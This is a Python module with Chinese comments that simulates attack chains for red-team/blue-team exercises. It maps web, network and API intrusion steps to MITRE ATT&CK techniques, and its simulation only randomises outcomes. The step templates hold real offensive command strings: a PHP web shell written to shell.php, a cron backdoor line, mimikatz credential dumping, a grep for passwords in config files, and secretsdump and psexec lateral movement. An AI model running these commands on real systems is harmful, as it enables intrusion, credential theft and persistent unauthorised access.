#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
攻击链模拟器
模拟完整的网络攻击链，用于红蓝对抗演练
"""

import json
from typing import Dict, List, Optional, Any
from dataclasses import dataclass, field
from datetime import datetime

from .attack_mapper import AttackMapper, ATTCTechnique


@dataclass
class AttackStep:
    """攻击步骤"""
    step_id: str = ""
    phase: str = ""  # kill chain阶段
    name: str = ""
    description: str = ""
    technique_id: str = ""
    technique_name: str = ""
    tools: List[str] = field(default_factory=list)
    commands: List[str] = field(default_factory=list)
    expected_result: str = ""
    success: bool = False
    output: str = ""
    duration: float = 0.0  # 秒
    risk_level: str = "medium"  # low/medium/high/critical


@dataclass
class AttackChain:
    """攻击链"""
    chain_id: str = ""
    name: str = ""
    description: str = ""
    target: str = ""
    steps: List[AttackStep] = field(default_factory=list)
    start_time: str = ""
    end_time: str = ""
    status: str = "pending"  # pending/running/completed/failed
    overall_success: bool = False
    mitre_techniques: List[str] = field(default_factory=list)


class AttackChainSimulator:
    """攻击链模拟器"""

    # 标准攻击链模板
    CHAIN_TEMPLATES = {
        "web_penetration": {
            "name": "Web应用渗透测试链",
            "description": "标准Web应用渗透测试攻击链",
            "steps": [
                {
                    "phase": "reconnaissance",
                    "name": "信息收集",
                    "description": "收集目标信息，包括子域名、IP、技术栈",
                    "technique_id": "T1592",
                    "tools": ["nmap", "subfinder", "httpx", "whatweb"],
                    "commands": [
                        "subfinder -d {target} -silent",
                        "nmap -sV -sC -p- {target}",
                        "whatweb {target}",
                    ],
                    "expected_result": "获取目标子域名、开放端口、服务版本",
                    "risk_level": "low",
                },
                {
                    "phase": "reconnaissance",
                    "name": "目录与参数发现",
                    "description": "发现隐藏目录、文件和API端点",
                    "technique_id": "T1046",
                    "tools": ["gobuster", "ffuf", "dirsearch"],
                    "commands": [
                        "gobuster dir -u {target} -w wordlist.txt",
                        "ffuf -u {target}/FUZZ -w wordlist.txt",
                    ],
                    "expected_result": "发现隐藏目录和API端点",
                    "risk_level": "low",
                },
                {
                    "phase": "exploitation",
                    "name": "漏洞扫描",
                    "description": "扫描已知漏洞和配置错误",
                    "technique_id": "T1190",
                    "tools": ["nuclei", "nikto", "sqlmap"],
                    "commands": [
                        "nuclei -u {target} -t cves/",
                        "nikto -h {target}",
                        "sqlmap -u {target} --batch",
                    ],
                    "expected_result": "发现可利用的漏洞",
                    "risk_level": "medium",
                },
                {
                    "phase": "exploitation",
                    "name": "漏洞验证与利用",
                    "description": "验证漏洞并尝试利用",
                    "technique_id": "T1203",
                    "tools": ["sqlmap", "metasploit", "custom_poc"],
                    "commands": [
                        "sqlmap -u {vuln_url} --dbs",
                        "msfconsole -x use exploit/...",
                    ],
                    "expected_result": "成功利用漏洞获取访问权限",
                    "risk_level": "high",
                },
                {
                    "phase": "post_exploitation",
                    "name": "权限提升",
                    "description": "提升权限获取更高访问级别",
                    "technique_id": "T1068",
                    "tools": ["linpeas", "winpeas", "sudo"],
                    "commands": [
                        "./linpeas.sh",
                        "sudo -l",
                    ],
                    "expected_result": "获取root/administrator权限",
                    "risk_level": "high",
                },
                {
                    "phase": "collection",
                    "name": "数据收集",
                    "description": "收集敏感数据和凭据",
                    "technique_id": "T1005",
                    "tools": ["mimikatz", "grep", "find"],
                    "commands": [
                        "mimikatz sekurlsa::logonpasswords",
                        "find / -name '*.conf' -exec grep -l password {} \\;",
                    ],
                    "expected_result": "获取敏感数据和凭据",
                    "risk_level": "critical",
                },
                {
                    "phase": "persistence",
                    "name": "持久化",
                    "description": "建立持久化访问机制",
                    "technique_id": "T1505.003",
                    "tools": ["webshell", "cron", "systemd"],
                    "commands": [
                        "echo '<?php system($_GET[cmd]); ?>' > shell.php",
                        "(crontab -l; echo '* * * * * /tmp/backdoor') | crontab -",
                    ],
                    "expected_result": "建立持久化后门",
                    "risk_level": "critical",
                },
            ],
        },
        "network_intrusion": {
            "name": "网络入侵链",
            "description": "网络渗透测试攻击链",
            "steps": [
                {
                    "phase": "reconnaissance",
                    "name": "网络扫描",
                    "description": "扫描目标网络存活主机和开放端口",
                    "technique_id": "T1046",
                    "tools": ["nmap", "masscan", "arp-scan"],
                    "commands": [
                        "nmap -sn {target_range}",
                        "masscan -p1-65535 {target_range} --rate=1000",
                    ],
                    "expected_result": "发现存活主机和开放端口",
                    "risk_level": "low",
                },
                {
                    "phase": "initial_access",
                    "name": "服务漏洞利用",
                    "description": "利用网络服务漏洞获取初始访问",
                    "technique_id": "T1190",
                    "tools": ["metasploit", "searchsploit"],
                    "commands": [
                        "searchsploit {service} {version}",
                        "msfconsole -x use exploit/...",
                    ],
                    "expected_result": "获取目标系统访问权限",
                    "risk_level": "high",
                },
                {
                    "phase": "credential_access",
                    "name": "凭据获取",
                    "description": "获取系统凭据和哈希",
                    "technique_id": "T1003",
                    "tools": ["mimikatz", "hashdump", "secretsdump"],
                    "commands": [
                        "mimikatz sekurlsa::logonpasswords",
                        "secretsdump.py domain/user:pass@target",
                    ],
                    "expected_result": "获取用户凭据和哈希",
                    "risk_level": "critical",
                },
                {
                    "phase": "lateral_movement",
                    "name": "横向移动",
                    "description": "在网络内部横向移动",
                    "technique_id": "T1021",
                    "tools": ["psexec", "wmiexec", "crackmapexec"],
                    "commands": [
                        "psexec.py domain/user:pass@target",
                        "crackmapexec smb {target_range} -u user -p pass",
                    ],
                    "expected_result": "访问网络内其他主机",
                    "risk_level": "critical",
                },
            ],
        },
        "api_attack": {
            "name": "API攻击链",
            "description": "API安全测试攻击链",
            "steps": [
                {
                    "phase": "reconnaissance",
                    "name": "API发现",
                    "description": "发现API端点和文档",
                    "technique_id": "T1592",
                    "tools": ["katana", "gau", "waybackurls"],
                    "commands": [
                        "katana -u {target}",
                        "gau {target} | grep -i api",
                    ],
                    "expected_result": "发现API端点",
                    "risk_level": "low",
                },
                {
                    "phase": "exploitation",
                    "name": "API漏洞测试",
                    "description": "测试API常见漏洞",
                    "technique_id": "T1190",
                    "tools": ["postman", "burp", "custom_scripts"],
                    "commands": [
                        "测试BOLA/IDOR漏洞",
                        "测试批量赋值漏洞",
                        "测试JWT配置错误",
                    ],
                    "expected_result": "发现API安全漏洞",
                    "risk_level": "medium",
                },
                {
                    "phase": "exploitation",
                    "name": "API利用",
                    "description": "利用API漏洞获取数据或权限",
                    "technique_id": "T1213",
                    "tools": ["curl", "python_scripts"],
                    "commands": [
                        "curl -X GET {api_endpoint}",
                        "利用BOLA访问其他用户数据",
                    ],
                    "expected_result": "成功利用API漏洞",
                    "risk_level": "high",
                },
            ],
        },
    }

    def __init__(self):
        self.attack_mapper = AttackMapper()

    def create_chain(self, template_name: str, target: str = "") -> Optional[AttackChain]:
        """
        创建攻击链

        Args:
            template_name: 模板名称
            target: 目标

        Returns:
            AttackChain攻击链
        """
        template = self.CHAIN_TEMPLATES.get(template_name)
        if not template:
            return None

        chain = AttackChain(
            chain_id=f"CHAIN-{datetime.now().strftime('%Y%m%d-%H%M%S')}",
            name=template["name"],
            description=template["description"],
            target=target,
            start_time=datetime.now().isoformat(),
        )

        for i, step_data in enumerate(template["steps"]):
            step = AttackStep(
                step_id=f"STEP-{i+1:03d}",
                phase=step_data["phase"],
                name=step_data["name"],
                description=step_data["description"],
                technique_id=step_data["technique_id"],
                tools=step_data.get("tools", []),
                commands=[c.replace("{target}", target) for c in step_data.get("commands", [])],
                expected_result=step_data.get("expected_result", ""),
                risk_level=step_data.get("risk_level", "medium"),
            )

            # 获取技术名称
            tech = self.attack_mapper.get_technique_details(step.technique_id)
            if tech:
                step.technique_name = tech.name

            chain.steps.append(step)
            if step.technique_id:
                chain.mitre_techniques.append(step.technique_id)

        return chain

    def simulate_step(self, step: AttackStep) -> AttackStep:
        """
        模拟单个攻击步骤（不实际执行，仅模拟）

        Args:
            step: 攻击步骤

        Returns:
            更新后的步骤
        """
        import random
        import time

        start = time.time()

        # 模拟执行（基于风险级别和工具数量的成功率）
        base_success_rate = {
            "low": 0.95,
            "medium": 0.80,
            "high": 0.60,
            "critical": 0.40,
        }

        success_rate = base_success_rate.get(step.risk_level, 0.7)
        step.success = random.random() < success_rate

        # 模拟输出
        if step.success:
            step.output = f"[+] {step.name} 执行成功\n"
            step.output += f"[+] 预期结果: {step.expected_result}\n"
            step.output += f"[+] 使用工具: {', '.join(step.tools)}\n"
        else:
            step.output = f"[-] {step.name} 执行失败\n"
            step.output += f"[-] 原因: 目标防御机制阻止了攻击\n"
            step.output += f"[-] 建议: 尝试其他攻击路径或工具\n"

        step.duration = round(time.time() - start + random.uniform(0.5, 3.0), 2)
        return step

    def simulate_chain(self, chain: AttackChain) -> AttackChain:
        """
        模拟完整攻击链

        Args:
            chain: 攻击链

        Returns:
            更新后的攻击链
        """
        chain.status = "running"
        chain.start_time = datetime.now().isoformat()

        all_success = True
        for i, step in enumerate(chain.steps):
            chain.steps[i] = self.simulate_step(step)
            if not chain.steps[i].success:
                all_success = False
                # 关键步骤失败则停止
                if step.risk_level in ("high", "critical"):
                    break

        chain.overall_success = all_success
        chain.status = "completed" if all_success else "failed"
        chain.end_time = datetime.now().isoformat()

        return chain

    def get_available_templates(self) -> List[Dict]:
        """获取可用模板列表"""
        return [
            {
                "id": key,
                "name": value["name"],
                "description": value["description"],
                "steps_count": len(value["steps"]),
            }
            for key, value in self.CHAIN_TEMPLATES.items()
        ]

    def generate_chain_report(self, chain: AttackChain) -> Dict:
        """生成攻击链报告"""
        total_duration = sum(s.duration for s in chain.steps)
        success_count = sum(1 for s in chain.steps if s.success)

        return {
            "chain_id": chain.chain_id,
            "name": chain.name,
            "description": chain.description,
            "target": chain.target,
            "status": chain.status,
            "overall_success": chain.overall_success,
            "start_time": chain.start_time,
            "end_time": chain.end_time,
            "total_steps": len(chain.steps),
            "successful_steps": success_count,
            "failed_steps": len(chain.steps) - success_count,
            "total_duration": round(total_duration, 2),
            "mitre_techniques": chain.mitre_techniques,
            "steps": [
                {
                    "step_id": s.step_id,
                    "phase": s.phase,
                    "name": s.name,
                    "technique_id": s.technique_id,
                    "technique_name": s.technique_name,
                    "success": s.success,
                    "duration": s.duration,
                    "risk_level": s.risk_level,
                    "output": s.output,
                }
                for s in chain.steps
            ],
        }

    def create_custom_chain(self, name: str, steps: List[Dict],
                            target: str = "", description: str = "") -> AttackChain:
        """创建自定义攻击链"""
        chain = AttackChain(
            chain_id=f"CHAIN-{datetime.now().strftime('%Y%m%d-%H%M%S')}",
            name=name,
            description=description,
            target=target,
            start_time=datetime.now().isoformat(),
        )

        for i, step_data in enumerate(steps):
            step = AttackStep(
                step_id=f"STEP-{i+1:03d}",
                phase=step_data.get("phase", ""),
                name=step_data.get("name", ""),
                description=step_data.get("description", ""),
                technique_id=step_data.get("technique_id", ""),
                tools=step_data.get("tools", []),
                commands=step_data.get("commands", []),
                expected_result=step_data.get("expected_result", ""),
                risk_level=step_data.get("risk_level", "medium"),
            )
            chain.steps.append(step)

        return chain
